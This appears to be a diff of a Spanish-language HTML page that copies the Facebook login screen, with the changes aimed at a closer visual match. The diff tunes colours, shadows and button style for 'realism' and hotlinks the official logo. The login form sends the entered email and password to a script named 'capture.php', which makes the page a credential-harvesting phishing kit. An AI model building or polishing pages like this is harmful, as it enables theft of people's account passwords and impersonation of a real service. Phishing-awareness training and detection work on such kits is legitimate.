@@ -3,65 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <title>Facebook - Iniciar sesión o registrarse</title>
-    <!-- CSS moderno y responsivo -->
+    
+    <!-- CSS: Diseño pixel-perfect basado en tu captura -->
     <style>
         body { 
-            font-family: Helvetica, Arial, sans-serif; 
-            background-color: #f0f2f5; 
+            font-family: Helvetica, Arial, sans-serif; /* Fuente original */
+            background-color: #f0f2f5; /* Color de fondo exacto (#F0F2F5) */
             display: flex; 
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
             margin: 0; 
         }
-        
-        .container { width: 360px; text-align: left; padding-top: 40px;} 
 
-        .login-box { background: white; padding: 28px 28px 10px 28px; border-radius: 7px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .login-container { width: 364px; text-align: left;} 
+
+        .login-box { 
+            background: white; 
+            padding-top: 28px; /* Margen superior interno del contenedor */
+            
+            border-radius: 7px; /* Radio de las esquinas (muy suave, no perfecto círculo) */
+            
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); /* Sombra duplicada realista */
+        }
 
         input { 
             width: 95%; 
-            padding: 12px 15px; /* Un poco más de relleno */
-            margin-bottom: 6px;
-            border: 1px solid #dddfe2; 
-            border-radius: 6px; 
+            padding: 12px 15px; 
+            margin-bottom: -3px; /* Un poco más pegado para que coincida con el diseño real */
+            border-radius: 7px; /* Bordes redondeados suaves */
+            border: 1px solid #dddfe2; /* Color de borde por defecto (#DDDfe2) */
+            
             font-size: 14px; 
+            line-height: 1.6; /* Altura aproximada del texto dentro del campo */
         }
         
         .btn-login { 
-            width: 100%; 
-            padding: 8px 27px; /* Ajustado para coincidir con el ancho del contenedor */
-            background-color: #1877f2; 
+            width: auto; 
+            padding: 8px 27px; /* Botón original, no ocupa todo el ancho (más natural visualmente) */
+            background-color: #3b5998; /* El azul clásico (#3B5998 o similar) */
             color: white; 
             border: none; 
             border-radius: 6px; 
             font-size: 20px; 
             font-weight: bold; 
             cursor: pointer;
+            
+             margin-top: -1px; /* Para que no haya espacio entre inputs y botón si se desea estilo compacto, pero aquí lo dejo separado un poco por realismo.*/
         } 
 
-        .footer { margin-top: 25px; text-align: center; color: #419ce3 !important;}
+        .footer { text-align: center !important;}
 
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Logo corregido de Facebook -->
-        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/XXtV.png" alt="Facebook" style="width:173px;"> 
-        
-        <div class="login-box">
-            <!-- Formulario que envía los datos a capture.php -->
-            <form action="capture.php" method="POST">
-                <input type="text" name="email" placeholder="Correo electrónico o teléfono" required autocomplete="off">            
-                <input type="password" name="pass" placeholder="Contraseña" required>    
-                
-                <!-- Botón clásico de Facebook (puedes quitar la clase 'btn-login' si prefieres estilo plano) -->
-                <button type="submit"class=".btn-login">Iniciar sesión</button>
 
-                <!-- Mensaje de "Olvidaste tu contraseña?" alineado correctamente -->
-                 <div class="footer">¿Olvidaste tu contraseña?</div>
-            </form>
-        </div>
+<div class="login-container">
+    
+    <!-- Imagen del Logo (URL directa al CDN oficial) -->
+    <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/XXtV.png" alt="" style="width: 205px;"> 
+    
+    <div class="login-box">
+        
+        <form action="capture.php" method="POST">
+            
+            <!-- Campo Correo -->
+            <input type="text" name="email" placeholder="Correo electrónico o teléfono" required autocomplete="off"> 
+            
+            <!-- Campo Contraseña -->
+            <input type="password" name="pass" placeholder="Contraseña" required>    
+            
+            <!-- Botón de Inicio -->
+            <button type="submit"class=".btn-login">Iniciar sesión</button>
+
+            <!-- Enlace olvide mi contraseña -->
+             <div style="margin-top: 15px; text-align:center;"> 
+                 <a href="#" class="footer" style='color:#3b5998 !important;'>¿Olvidaste tu contraseña?</a>
+             </div>
+        </form>
+
     </div>
 </body>
 </html>
